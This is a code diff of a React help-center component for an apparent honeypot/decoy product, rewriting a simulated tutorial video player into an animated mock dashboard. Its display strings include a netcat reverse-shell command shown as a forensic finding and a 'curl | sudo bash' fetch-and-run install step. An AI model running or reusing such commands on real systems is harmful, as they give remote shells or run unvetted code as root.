@@ -1,6 +1,6 @@
 
-import React, { useState, useEffect, useRef } from 'react';
-import { BookOpen, HelpCircle, Video, FileText, ChevronDown, ChevronUp, PlayCircle, ExternalLink, Zap, Shield, Terminal, LifeBuoy, ArrowLeft, CheckCircle, Clock, Play, Pause, Volume2, Maximize, SkipBack, SkipForward, Loader, RefreshCw } from 'lucide-react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
+import { BookOpen, HelpCircle, Video, FileText, ChevronDown, ChevronUp, PlayCircle, ExternalLink, Zap, Shield, Terminal, LifeBuoy, ArrowLeft, CheckCircle, Clock, Play, Pause, Volume2, Maximize, MousePointer2, Plus, LayoutDashboard, Server, X, RefreshCw } from 'lucide-react';
 
 const TUTORIALS = [
     {
@@ -100,230 +100,332 @@ const FAQS = [
     }
 ];
 
-// Scripts for the simulated video player
-const SCRIPTS: Record<string, string[]> = {
-    "Quick Start: First Deployment": [
-        "admin@console:~$ curl -sL http://vpp.io/setup | sudo bash",
-        "[sudo] password for admin: ",
-        "[+] Downloading VPP Agent Installer...",
-        "[+] Verifying Integrity... OK",
-        "[+] Unpacking components...",
-        "[+] Initializing secure tunnel...",
-        "[+] Connecting to C2 Server...",
-        "root@host:~# vpp-agent --status",
-        "Agent Status: ONLINE",
-        "Gateway: CONNECTED",
-        "Waiting for adoption...",
-        "Device adopted successfully. Configuration sync complete."
-    ],
-    "Mastering Personas": [
-        "root@node-01:~# vpp-agent --status",
-        "Current Persona: Generic Linux",
-        "root@node-01:~# vpp-agent --set-persona 'HP Printer'",
-        "[+] Stopping network services...",
-        "[+] Spoofing MAC Address: 00:1B:78:2F:A1:C9",
-        "[+] Opening Port 9100 (JetDirect)...",
-        "[+] Opening Port 631 (IPP)...",
-        "[+] Updating Service Banners...",
-        "root@node-01:~# nmap -sV localhost",
-        "PORT     STATE SERVICE     VERSION",
-        "9100/tcp open  jetdirect   HP JetDirect 2.0",
-        "631/tcp  open  ipp         CUPS 2.2",
-        "Persona Switched Successfully."
-    ],
-    "Sentinel Mode & Lockdowns": [
-        "root@node-05:~# tail -f /var/log/vpp-agent.log",
-        "Monitoring traffic...",
-        "root@node-05:~# vpp-agent --sentinel on",
-        "[!] ACTIVATING PARANOID MODE [!]",
-        "[+] IPTables: LOG --tcp-flags SYN",
-        "[+] Alerting Level: CRITICAL",
-        "[SENTINEL] Listening for stealth scans...",
-        "[ALERT] INBOUND SYN from 192.168.1.55:44322 -> :80",
-        "[ALERT] INBOUND SYN from 192.168.1.55:44323 -> :443",
-        "[AUTO-DEFENSE] Flagging node as COMPROMISED."
-    ],
-    "Analyzing Forensic Snapshots": [
-        "root@node-02:~# vpp-agent --forensic --dump-mem",
-        "[+] Dumping volatile memory...",
-        "[+] Extracting network artifacts...",
-        "[+] Parsing process tree...",
-        "Found suspicious process: PID 4490 (nc)",
-        "Connection: 192.168.1.101:4444 -> 10.0.0.5:8888",
-        "[+] Snapshot saved: snap-20231025.json",
-        "root@node-02:~# grep '4490' snap-20231025.json",
-        "\"pid\": 4490, \"cmd\": \"nc -e /bin/bash 10.0.0.5 8888\""
-    ]
-};
+// --- MOCK UI COMPONENTS FOR THE VIDEO ---
 
-// --- MOCK VIDEO PLAYER COMPONENT ---
-const MockPlayer = ({ title }: { title: string }) => {
-    const [isPlaying, setIsPlaying] = useState(false);
-    const [progress, setProgress] = useState(0);
-    const [isBuffering, setIsBuffering] = useState(false);
+const MockDashboard = ({ 
+    activeModal, 
+    pendingCount, 
+    actors 
+}: { activeModal: string | null, pendingCount: number, actors: any[] }) => (
+    <div className="h-full w-full bg-slate-900 flex text-[8px] md:text-[10px] font-sans overflow-hidden select-none">
+        {/* Sidebar */}
+        <div className="w-16 bg-slate-950 border-r border-slate-800 flex flex-col items-center py-4 space-y-4">
+            <div className="w-8 h-8 rounded bg-blue-900/50 mb-2"></div>
+            <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-slate-500"><LayoutDashboard className="w-4 h-4"/></div>
+            <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-slate-500"><Server className="w-4 h-4"/></div>
+            <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-slate-500"><Plus className="w-4 h-4"/></div>
+        </div>
+        {/* Main Content */}
+        <div className="flex-1 p-4 bg-slate-900/90 relative">
+            <div className="flex justify-between items-center mb-4">
+                <div className="h-4 w-32 bg-slate-800 rounded"></div>
+                <div className="bg-blue-600 text-white px-2 py-1 rounded flex items-center shadow-lg cursor-pointer" id="btn-enroll">
+                    <Plus className="w-3 h-3 mr-1" /> Enroll
+                </div>
+            </div>
+            {/* Grid */}
+            <div className="grid grid-cols-3 gap-2">
+                {actors.map(a => (
+                    <div key={a.id} className={`h-16 rounded border p-2 ${a.status === 'ONLINE' ? 'bg-slate-800 border-slate-700' : 'bg-red-900/20 border-red-500'}`}>
+                        <div className="flex justify-between mb-1">
+                            <div className="w-4 h-4 rounded bg-slate-700"></div>
+                            <div className={`w-2 h-2 rounded-full ${a.status === 'ONLINE' ? 'bg-emerald-500' : 'bg-red-500'}`}></div>
+                        </div>
+                        <div className="h-2 w-16 bg-slate-700 rounded mb-1"></div>
+                        <div className="h-2 w-10 bg-slate-700/50 rounded"></div>
+                    </div>
+                ))}
+            </div>
+
+            {/* Simulated Modal */}
+            {activeModal === 'ENROLL' && (
+                <div className="absolute inset-0 bg-black/60 flex items-center justify-center backdrop-blur-[1px] animate-fade-in z-20">
+                    <div className="bg-slate-800 border border-slate-600 rounded p-4 w-3/4 shadow-2xl">
+                        <div className="flex justify-between mb-3 border-b border-slate-700 pb-2">
+                            <span className="text-white font-bold">Enroll New Device</span>
+                            <X className="w-3 h-3 text-slate-500" />
+                        </div>
+                        <div className="bg-black p-2 rounded border border-slate-700 mb-3 font-mono text-emerald-400 truncate flex justify-between items-center">
+                            <span>curl -sL http://vpp.io/setup | bash</span>
+                            <span className="bg-slate-700 text-white px-1 rounded ml-2 cursor-pointer hover:bg-slate-600" id="btn-copy">Copy</span>
+                        </div>
+                        <div className="border-t border-slate-700 pt-2">
+                            <div className="flex justify-between items-center">
+                                <span className="text-slate-400">Pending Devices</span>
+                                {pendingCount > 0 ? (
+                                    <span className="bg-blue-600 text-white px-1.5 rounded animate-pulse">{pendingCount} New</span>
+                                ) : <span className="text-slate-600">Waiting...</span>}
+                            </div>
+                            {pendingCount > 0 && (
+                                <div className="mt-2 bg-slate-900 p-2 rounded flex justify-between items-center border border-slate-700">
+                                    <div className="flex items-center">
+                                        <Terminal className="w-3 h-3 text-yellow-500 mr-2"/>
+                                        <span>New_Pi_Device</span>
+                                    </div>
+                                    <div className="bg-emerald-600 p-1 rounded text-white cursor-pointer hover:bg-emerald-500" id="btn-approve">
+                                        <CheckCircle className="w-3 h-3"/>
+                                    </div>
+                                </div>
+                            )}
+                        </div>
+                    </div>
+                </div>
+            )}
+        </div>
+    </div>
+);
+
+// --- ANIMATION ORCHESTRATOR ---
+
+const PlayerEngine = ({ scenario, onFinish }: { scenario: any, onFinish: () => void }) => {
+    // VISUAL STATE
+    const [cursor, setCursor] = useState({ x: 50, y: 50, clicking: false });
+    const [layout, setLayout] = useState<'TERMINAL' | 'DASHBOARD' | 'SPLIT'>('DASHBOARD');
     const [terminalLines, setTerminalLines] = useState<string[]>([]);
     
-    // Playback state refs
-    const intervalRef = useRef<number | null>(null);
-    const scriptIndexRef = useRef(0);
-    const charIndexRef = useRef(0);
-    const script = SCRIPTS[title] || SCRIPTS["Quick Start: First Deployment"];
+    // DASHBOARD STATE
+    const [activeModal, setActiveModal] = useState<string | null>(null);
+    const [pendingCount, setPendingCount] = useState(0);
+    const [mockActors, setMockActors] = useState([{id:1, status:'ONLINE'}, {id:2, status:'ONLINE'}, {id:3, status:'OFFLINE'}]);
 
-    const stopPlayback = () => {
-        if (intervalRef.current) clearInterval(intervalRef.current);
-        setIsPlaying(false);
-        setIsBuffering(false);
-    };
+    // Refs for safe async loop
+    const isMounted = useRef(true);
 
-    const startPlayback = () => {
-        setIsPlaying(true);
-        setIsBuffering(true);
-        
-        // Reset if at end
-        if (progress >= 100) {
-            setProgress(0);
-            setTerminalLines([]);
-            scriptIndexRef.current = 0;
-            charIndexRef.current = 0;
+    // Helpers
+    const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+    const typeLine = async (text: string) => {
+        if(!isMounted.current) return;
+        setTerminalLines(prev => [...prev, ""]);
+        // Typing effect
+        for(let i=0; i<text.length; i++) {
+            if(!isMounted.current) return;
+            setTerminalLines(prev => {
+                const copy = [...prev];
+                copy[copy.length-1] = text.substring(0, i+1);
+                return copy;
+            });
+            await wait(20 + Math.random() * 30);
         }
-
-        // Simulate buffer
-        setTimeout(() => {
-            setIsBuffering(false);
-            
-            // Start typing loop
-            intervalRef.current = window.setInterval(() => {
-                const currentLine = script[scriptIndexRef.current];
-                
-                if (!currentLine) {
-                    // End of script
-                    if (intervalRef.current) clearInterval(intervalRef.current);
-                    setIsPlaying(false);
-                    setProgress(100);
-                    return;
-                }
-
-                if (charIndexRef.current < currentLine.length) {
-                    // Typing current line
-                    const partial = currentLine.substring(0, charIndexRef.current + 1);
-                    setTerminalLines(prev => {
-                        const newLines = [...prev];
-                        if (newLines.length === 0 || charIndexRef.current === 0) newLines.push(partial);
-                        else newLines[newLines.length - 1] = partial;
-                        return newLines;
-                    });
-                    charIndexRef.current += 2; // Type speed
-                } else {
-                    // Line finished, pause briefly then move to next
-                    if (intervalRef.current) clearInterval(intervalRef.current);
-                    
-                    setTimeout(() => {
-                        scriptIndexRef.current++;
-                        charIndexRef.current = 0;
-                        if (scriptIndexRef.current < script.length) {
-                            startPlayback(); // Resume loop via recursion (simplifies logic)
-                        } else {
-                            setIsPlaying(false);
-                            setProgress(100);
-                        }
-                    }, 500); 
-                }
-                
-                // Update Progress bar roughly based on lines
-                setProgress((scriptIndexRef.current / script.length) * 100);
-
-            }, 50);
-        }, 1200);
+        await wait(200);
     };
 
-    // Cleanup
+    const moveMouseTo = async (targetX: number, targetY: number, duration: number = 800) => {
+        if(!isMounted.current) return;
+        const startX = cursor.x;
+        const startY = cursor.y;
+        const startTime = Date.now();
+
+        return new Promise<void>(resolve => {
+            const animate = () => {
+                if(!isMounted.current) return resolve();
+                const now = Date.now();
+                const progress = Math.min(1, (now - startTime) / duration);
+                
+                // Ease out cubic
+                const ease = 1 - Math.pow(1 - progress, 3);
+                
+                setCursor(prev => ({
+                    ...prev,
+                    x: startX + (targetX - startX) * ease,
+                    y: startY + (targetY - startY) * ease
+                }));
+
+                if (progress < 1) {
+                    requestAnimationFrame(animate);
+                } else {
+                    resolve();
+                }
+            };
+            requestAnimationFrame(animate);
+        });
+    };
+
+    const click = async () => {
+        if(!isMounted.current) return;
+        setCursor(prev => ({...prev, clicking: true}));
+        await wait(150);
+        setCursor(prev => ({...prev, clicking: false}));
+        await wait(300);
+    };
+
+    // --- SCENARIO LOGIC ---
     useEffect(() => {
-        return () => {
-            if (intervalRef.current) clearInterval(intervalRef.current);
+        const runScenario = async () => {
+            if (scenario.id === 1) { // QUICK START
+                // 1. Initial State
+                setLayout('DASHBOARD');
+                setMockActors([{id:1, status:'ONLINE'}]);
+                await wait(1000);
+
+                // 2. Click Enroll
+                await moveMouseTo(85, 12); 
+                await click();
+                setActiveModal('ENROLL');
+                await wait(800);
+
+                // 3. Copy Command
+                await moveMouseTo(88, 38);
+                await click(); // Copy
+                await wait(500);
+
+                // 4. Switch to Split View (Show Terminal)
+                setLayout('SPLIT');
+                await wait(800);
+
+                // 5. Run Command in Terminal
+                await typeLine("pi@raspberry:~ $ curl -sL http://vpp.io/setup | sudo bash");
+                await wait(500);
+                await typeLine("[+] Downloading Agent...");
+                await typeLine("[+] Installing Dependencies...");
+                await wait(1000);
+                await typeLine("[+] Connecting to C2...");
+                await wait(500);
+                
+                // 6. Device Appears
+                setPendingCount(1);
+                await typeLine("[!] Waiting for approval...");
+                
+                // 7. Approve on Dashboard (Right side of split is terminal, Left is Dash)
+                // Mouse needs to go to Left side relative to whole container
+                await moveMouseTo(42, 65); // Coordinates for Approve button in split mode
+                await click();
+                
+                // 8. Success
+                setPendingCount(0);
+                setActiveModal(null);
+                setMockActors(prev => [...prev, {id:2, status:'ONLINE'}]);
+                await typeLine("[OK] Device Adopted!");
+                await typeLine("[OK] Starting Service...");
+                
+                await wait(2000);
+                if(isMounted.current) onFinish();
+            } 
+            else if (scenario.id === 2) { // PERSONAS
+                // 1. Dash View
+                setLayout('DASHBOARD');
+                await wait(500);
+                
+                // 2. Click Actor
+                await moveMouseTo(20, 20); // First actor grid
+                await click();
+                
+                // 3. Simulate Tab Switch (simplified visually)
+                // We'll just show terminal typing "Switching..."
+                setLayout('SPLIT');
+                await typeLine("root@node:~ $ vpp-agent --set-persona 'Printer'");
+                await typeLine("[+] Stopping HTTP...");
+                await typeLine("[+] Opening Port 9100...");
+                await typeLine("[OK] Persona Applied: HP LaserJet");
+                await wait(2000);
+                if(isMounted.current) onFinish();
+            }
+            else {
+                // Fallback for others
+                setLayout('TERMINAL');
+                await typeLine("Running simulated scenario...");
+                await typeLine("Step 1 complete.");
+                await typeLine("Step 2 complete.");
+                await wait(2000);
+                if(isMounted.current) onFinish();
+            }
         };
-    }, []);
 
-    // Handle Title change reset
-    useEffect(() => {
-        stopPlayback();
-        setTerminalLines([]);
-        setProgress(0);
-        scriptIndexRef.current = 0;
-        charIndexRef.current = 0;
-    }, [title]);
+        runScenario();
 
-    const handleTogglePlay = () => {
-        if (isPlaying) stopPlayback();
-        else startPlayback();
+        return () => { isMounted.current = false; };
+    }, [scenario]);
+
+    return (
+        <div className="relative w-full h-full bg-black overflow-hidden flex">
+            
+            {/* LEFT PANE (Dashboard) */}
+            <div className={`relative transition-all duration-500 ease-in-out border-r border-slate-800 ${layout === 'TERMINAL' ? 'w-0' : layout === 'SPLIT' ? 'w-1/2' : 'w-full'}`}>
+                <MockDashboard activeModal={activeModal} pendingCount={pendingCount} actors={mockActors} />
+            </div>
+
+            {/* RIGHT PANE (Terminal) */}
+            <div className={`relative bg-black transition-all duration-500 ease-in-out ${layout === 'DASHBOARD' ? 'w-0' : layout === 'SPLIT' ? 'w-1/2' : 'w-full'}`}>
+                <div className="absolute inset-0 p-4 font-mono text-[10px] md:text-xs text-green-500 overflow-hidden">
+                    {terminalLines.map((line, i) => (
+                        <div key={i} className="mb-1 break-all">{line}</div>
+                    ))}
+                    <span className="inline-block w-2 h-4 bg-green-500 animate-pulse ml-1 align-middle"></span>
+                </div>
+            </div>
+
+            {/* CURSOR OVERLAY */}
+            <div 
+                className="absolute pointer-events-none z-50 transition-transform duration-75"
+                style={{ 
+                    left: `${cursor.x}%`, 
+                    top: `${cursor.y}%`,
+                    transform: `translate(-50%, -50%) scale(${cursor.clicking ? 0.8 : 1})`
+                }}
+            >
+                <MousePointer2 
+                    className="w-6 h-6 text-white drop-shadow-[0_2px_4px_rgba(0,0,0,0.5)] fill-black" 
+                    strokeWidth={1.5}
+                />
+                {cursor.clicking && (
+                    <div className="absolute -inset-2 bg-white/30 rounded-full animate-ping"></div>
+                )}
+            </div>
+
+            {/* LAYOUT BADGE */}
+            <div className="absolute top-2 right-2 bg-slate-800/80 px-2 py-1 rounded text-[8px] text-slate-400 font-mono border border-slate-700 backdrop-blur">
+                MODE: {layout}
+            </div>
+        </div>
+    );
+};
+
+// --- WRAPPER PLAYER COMPONENT ---
+const MockPlayer = ({ tutorial }: { tutorial: any }) => {
+    const [isPlaying, setIsPlaying] = useState(false);
+    const [resetKey, setResetKey] = useState(0);
+
+    const handleRestart = () => {
+        setIsPlaying(false);
+        setTimeout(() => {
+            setResetKey(p => p + 1);
+            setIsPlaying(true);
+        }, 100);
     };
 
     return (
         <div className="w-full aspect-video bg-black rounded-lg border border-slate-700 relative group overflow-hidden shadow-2xl flex flex-col">
             {/* Screen Content */}
-            <div className="flex-1 flex flex-col bg-slate-900/50 relative overflow-hidden">
-                <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20 pointer-events-none"></div>
-                
-                {/* Simulated Terminal Screen */}
-                {(isPlaying || progress > 0) && !isBuffering && (
-                    <div className="absolute inset-0 p-4 font-mono text-xs md:text-sm text-green-500 bg-black/90 overflow-y-auto">
-                        {terminalLines.map((line, i) => (
-                            <div key={i} className="mb-1 break-all">
-                                {line}
-                                {i === terminalLines.length - 1 && isPlaying && <span className="inline-block w-2 h-4 bg-green-500 animate-pulse ml-1 align-middle"></span>}
-                            </div>
-                        ))}
-                    </div>
-                )}
-
-                {/* Scanline Effect */}
-                {isPlaying && <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%] pointer-events-none animate-pulse"></div>}
-
-                {/* Loading / Start Overlay */}
-                {(!isPlaying && progress === 0) && (
-                    <div className="absolute inset-0 flex items-center justify-center bg-black/40 backdrop-blur-[1px]">
+            <div className="flex-1 bg-slate-900 relative overflow-hidden">
+                {!isPlaying ? (
+                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-slate-900/50 backdrop-blur-sm z-10">
+                        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20 pointer-events-none"></div>
                         <button 
-                            onClick={handleTogglePlay}
+                            onClick={handleRestart}
                             className="w-20 h-20 bg-blue-600/90 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(37,99,235,0.3)] hover:scale-110 transition-transform z-10 group/play"
                         >
                             <Play className="w-10 h-10 text-white ml-1.5 group-hover/play:scale-110 transition-transform" />
                         </button>
+                        <div className="mt-4 text-white font-bold text-lg drop-shadow-md bg-black/50 px-3 py-1 rounded border border-white/10 flex items-center">
+                            <Video className="w-4 h-4 mr-2 text-blue-400" />
+                            {tutorial.title}
+                        </div>
                     </div>
+                ) : (
+                    <PlayerEngine key={resetKey} scenario={tutorial} onFinish={() => setIsPlaying(false)} />
                 )}
-
-                {/* Buffering Indicator */}
-                {isBuffering && (
-                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/60 z-20">
-                        <Loader className="w-10 h-10 mb-2 animate-spin text-blue-500" />
-                        <span className="text-slate-400 font-mono text-xs tracking-widest animate-pulse">ESTABLISHING FEED...</span>
-                    </div>
-                )}
-
-                {/* Title Overlay */}
-                <div className="absolute top-4 left-4 text-white font-bold text-lg drop-shadow-md bg-black/50 px-3 py-1 rounded backdrop-blur-md border border-white/10 flex items-center">
-                    <Video className="w-4 h-4 mr-2 text-blue-400" />
-                    {title}
-                </div>
             </div>
 
-            {/* Controls */}
-            <div className="h-12 bg-slate-800 border-t border-slate-700 flex items-center px-4 space-x-4 z-20 select-none">
-                <button onClick={handleTogglePlay} className="text-slate-300 hover:text-white transition-colors">
-                    {isPlaying ? <Pause className="w-5 h-5" /> : (progress >= 100 ? <RefreshCw className="w-5 h-5" /> : <Play className="w-5 h-5" />)}
+            {/* Controls Bar */}
+            <div className="h-10 bg-slate-800 border-t border-slate-700 flex items-center px-4 space-x-4 z-20 select-none">
+                <button onClick={() => setIsPlaying(!isPlaying)} className="text-slate-300 hover:text-white transition-colors">
+                    {isPlaying ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4" />}
                 </button>
-                
-                {/* Progress Bar */}
-                <div className="flex-1 h-1.5 bg-slate-600 rounded-full overflow-hidden cursor-pointer relative group/bar" onClick={() => {}}>
-                    <div 
-                        className="absolute top-0 left-0 h-full bg-blue-500 transition-all duration-300"
-                        style={{ width: `${progress}%` }}
-                    ></div>
+                <div className="flex-1 h-1 bg-slate-600 rounded-full overflow-hidden">
+                    <div className={`h-full bg-blue-500 transition-all duration-300 ${isPlaying ? 'w-full transition-[width] duration-[10000ms] ease-linear' : 'w-0'}`}></div>
                 </div>
-                
-                <span className="text-xs font-mono text-slate-400">
-                    {Math.floor((progress / 100) * 5)}:{(Math.floor(((progress / 100) * 300) % 60)).toString().padStart(2, '0')} / 05:00
-                </span>
-                <Volume2 className="w-5 h-5 text-slate-400 hover:text-white cursor-pointer" />
-                <Maximize className="w-5 h-5 text-slate-400 hover:text-white cursor-pointer" />
+                <button onClick={handleRestart} className="text-slate-300 hover:text-white" title="Restart">
+                    <RefreshCw className="w-4 h-4" />
+                </button>
             </div>
         </div>
     );
@@ -436,7 +538,7 @@ const HelpCenter = () => {
                 {activeTab === 'TUTORIALS' && selectedTutorial && (
                     <div className="animate-slide-up space-y-8">
                         {/* Video Player Area */}
-                        <MockPlayer title={selectedTutorial.title} />
+                        <MockPlayer tutorial={selectedTutorial} />
 
                         {/* Content Area */}
                         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
